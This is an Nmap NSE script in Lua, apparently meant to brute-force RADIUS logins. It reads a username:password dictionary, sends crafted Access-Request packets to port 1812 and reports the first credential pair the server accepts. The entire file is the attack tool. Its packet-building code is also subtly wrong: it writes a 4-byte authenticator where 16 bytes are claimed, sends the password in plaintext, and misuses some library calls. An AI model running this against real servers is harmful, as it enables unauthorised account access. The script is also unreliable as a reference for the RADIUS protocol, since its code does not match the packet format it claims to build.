-- Script Name: radius-brute.nse
-- Purpose: Attempts to brute-force RADIUS usernames and passwords.
-- Author: Your Name
-- License: Same as Nmap

-- Import necessary libraries
local nmap = require "nmap"
local shortport = require "shortport"
local stdnse = require "stdnse"
local creds = require "creds"

-- Define the description of the script
description = [[
Attempts to brute-force RADIUS usernames and passwords using a list of common or provided credentials.
Includes options for specifying the dictionary file and rate limiting to avoid account lockouts.
For use in penetration testing scenarios where you have permission to attempt authentication.
]]

-- Define categories
categories = {"auth", "brute"}

-- Define script arguments
-- Arguments include: dictionary file, delay between requests, etc.
local args = stdnse.parse_args({
  {"radius-brute.dictionary", "Path to the username:password dictionary file (default: nselib/data/radius-default.txt)"},
  {"radius-brute.delay", "Delay in milliseconds between attempts (default: 100ms)", "number"},
})

-- Define default values
local DEFAULT_DICTIONARY = "nselib/data/radius-default.txt"
local DEFAULT_DELAY = 100 -- milliseconds

portrule = shortport.port_or_service({1812}, "radius")

-- Function to send a RADIUS Access-Request with provided credentials
local function send_radius_auth(host, port, username, password)
  local socket = nmap.new_socket()
  socket:set_timeout(5000) -- 5-second timeout

  -- Build RADIUS Access-Request packet
  local radius_request = "\x01\x03\x00" ..
                         string.char(20 + #username + #password) .. -- Code, Identifier, Length
                         "\x00\x00\x00\x00" .. -- Authenticator (16 bytes of zeros)
                         "\x01" .. string.char(2 + #username) .. username .. -- User-Name
                         "\x02" .. string.char(2 + #password) .. password -- User-Password

  local status, err = socket:sendto(host, port, radius_request)
  if not status then
    stdnse.print_debug(1, "Failed to send RADIUS request: %s", err)
    socket:close()
    return nil, err
  end

  local response, err = socket:receive()
  socket:close()

  if not response then
    stdnse.print_debug(1, "No response from RADIUS server: %s", err)
    return nil, err
  end

  -- Check if the response indicates a successful login
  return response:sub(1, 1) == "\x02" -- Code 2 (Access-Accept)
end

-- Main brute-force function
action = function(host, port)
  local dictionary_file = args["radius-brute.dictionary"] or DEFAULT_DICTIONARY
  local delay = args["radius-brute.delay"] or DEFAULT_DELAY

  local credentials = creds.parse(dictionary_file)
  if not credentials then
    return "Failed to load dictionary file"
  end

  for _, cred in ipairs(credentials) do
    local username, password = cred[1], cred[2]
    stdnse.print_debug(1, "Trying %s:%s", username, password)

    local success, err = send_radius_auth(host.ip, port.number, username, password)
    if success then
      return string.format("Valid credentials found: %s:%s", username, password)
    elseif err then
      stdnse.print_debug(1, "Error during attempt: %s", err)
    end

    stdnse.sleep(delay)
  end

  return "No valid credentials found"
end
